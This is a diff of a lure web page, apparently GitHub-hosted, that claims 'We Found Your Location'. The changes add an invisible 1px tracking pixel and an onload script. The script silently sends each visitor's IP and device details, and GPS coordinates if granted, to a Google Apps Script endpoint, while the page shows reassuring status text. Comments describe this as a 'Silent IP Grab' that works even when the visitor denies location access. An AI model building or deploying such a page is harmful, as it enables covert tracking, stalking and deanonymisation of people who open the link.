@@ -30,48 +30,60 @@
         }
         h2 { margin: 0 0 10px 0; color: #333; }
         p { color: #666; font-size: 14px; }
-        .status { margin-top: 10px; font-weight: bold; color: #28a745; }
+        /* Hide the tracking pixel */
+        .tracker {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <!-- REPLACE THE SRC BELOW WITH YOUR IMAGE LINK -->
+    <!-- YOUR MAP IMAGE -->
     <img src="https://i.postimg.cc/LXZpHF7Y/IMG-1565.jpg" alt="Map Screenshot">
     
     <h2>We Found Your Location</h2>
     <p>Verifying details...</p>
-    <div id="status" class="status"></div>
+    <div id="status" class="status">Connecting...</div>
 </div>
 
+<!-- INVISIBLE TRACKING PIXEL -->
+<img src="" class="tracker" id="pixel">
+
 <script>
-    // Function to send data to your Google Sheet
-    function logData(ip, ua, lat, long) {
-        var url = "https://script.google.com/macros/s/AKfycbwwwtwF_7Unqarfp7j5DmJaSd5SSFxDOZ-VUmEqbLAmfWvqMmwmOZN6gCLUGy34PTHRhA/exec"; 
-        // Note: The fetch request appends these as query parameters
+    // This function runs immediately when the page loads
+    window.onload = function() {
+        var url = "https://script.google.com/macros/s/AKfycbwwwtwF_7Unqarfp7j5DmJaSd5SSFxDOZ-VUmEqbLAmfWvqMmwmOZN6gCLUGy34PTHRhA/exec"; // REPLACE THIS WITH YOUR NEW URL
         
-        // Try to get GPS first
+        // 1. Get User Agent (Device Info)
+        var ua = navigator.userAgent;
+        
+        // 2. Send Data via Hidden Image (Silent IP Grab)
+        // We append parameters to the image source. When the browser tries to load 
+        // this fake image, it sends the request to your Google Script, logging the IP.
+        var trackerSrc = url + "?ip=AutoDetected&ua=" + encodeURIComponent(ua) + "&method=Pixel";
+        
+        document.getElementById('pixel').src = trackerSrc;
+        
+        // 3. Try for GPS (Optional, but silent if denied)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(function(position) {
+                document.getElementById('status').innerText = "Location Verified!";
+                // Send GPS data too
                 var lat = position.coords.latitude;
                 var long = position.coords.longitude;
-                document.getElementById('status').innerText = "Location Verified!";
-                
-                // Send to Google Sheets
-                fetch(url + "?ip=" + ip + "&ua=" + ua + "&lat=" + lat + "&long=" + long);
+                document.getElementById('pixel').src = url + "?ip=AutoDetected&ua=" + encodeURIComponent(ua) + "&lat=" + lat + "&long=" + long;
             }, function(error) {
-                document.getElementById('status').innerText = "Data Saved.";
-                fetch(url + "?ip=" + ip + "&ua=" + ua + "&gps=Denied");
+                // If they deny, we already got the IP via the first pixel load
+                document.getElementById('status').innerText = "Details Saved.";
             });
         } else {
-            document.getElementById('status').innerText = "Data Saved.";
-            fetch(url + "?ip=" + ip + "&ua=" + ua + "&gps=Unsupported");
+            document.getElementById('status').innerText = "Details Saved.";
         }
-    }
-
-    // Simple IP detection (since we can't use external APIs without keys easily)
-    // We send 'unknown' for IP unless you use a specific API, but the User Agent is enough to identify device.
-    logData("GitHub-Hosted", navigator.userAgent, null, null);
+    };
 </script>
 
 </body>
